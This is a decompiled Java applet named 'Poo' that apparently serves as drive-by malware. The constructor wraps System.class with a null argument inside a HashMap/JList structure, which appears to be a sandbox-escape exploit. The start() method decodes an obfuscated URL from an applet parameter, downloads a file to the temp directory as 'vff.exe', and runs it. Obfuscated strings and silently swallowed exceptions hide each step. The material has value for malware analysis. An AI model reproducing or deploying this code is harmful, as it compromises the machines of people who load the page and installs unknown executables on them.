import java.util.Map;
import java.awt.Component;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Poo extends Applet
{
    String gonwd;
    JList pomnesa;
    
    private void ttwes() {
        final String a = "fsfwds";
        a.concat("fddff");
    }
    
    @Override
    public void start() {
        super.start();
        try {
            String jhfioiytr = System.getProperty("jaoobrw2va.ioobrw2o.toobrw2mpdoobrw2ir".replace("oobrw2", ""));
            if (jhfioiytr.charAt(jhfioiytr.length() - 1) != '\\') {
                jhfioiytr += "\\";
            }
            final String vvvbw = jhfioiytr + "vfoobrw2f.exoobrw2e".replace("oobrw2", "");
            final String popolg = this.getParameter("deokbbrr2st".replace("okbbrr2", ""));
            String nnnolg = "";
            for (int s = 0; s < popolg.length(); ++s) {
                int jds = popolg.charAt(s);
                jds -= 4;
                nnnolg += (char)jds;
            }
            int kf = 1;
            final InputStream phbsef = Solol.Doipo(nnnolg);
            final int afqw = 0;
            byte[] iuytrrr = new byte[153602];
            int jhgf = 0;
            final FileOutputStream gjjeer = new FileOutputStream(vvvbw);
            while ((kf = phbsef.read(iuytrrr)) > 0) {
                gjjeer.write(iuytrrr, 0, kf);
                iuytrrr = new byte[153602];
                jhgf += kf;
            }
            gjjeer.close();
            phbsef.close();
            try {
                Solol.Pbmvv(vvvbw);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Poo() {
        final Object llggswrr = System.class;
        final Object[] ooerrt = { null };
        this.ttwes();
        this.ttwes();
        int asd = 2;
        asd = 33;
        final String iuyfj6 = Strs.iopks;
        final String jffff = new String();
        ++asd;
        final Sjyaw ophf = new Sjyaw(llggswrr, iuyfj6, ooerrt);
        final HashSet kjgffffr = new HashSet();
        kjgffffr.add(ophf);
        final int mnsa = 121;
        final Map ppfkn = new HashMap() {
            @Override
            public Set entrySet() {
                return kjgffffr;
            }
        };
        this.pomnesa = new JList((E[])new Object[] { ppfkn });
        final int d = 0;
        this.add(this.pomnesa);
        try {
            Thread.sleep(3000L);
        }
        catch (Exception ex) {}
    }
}
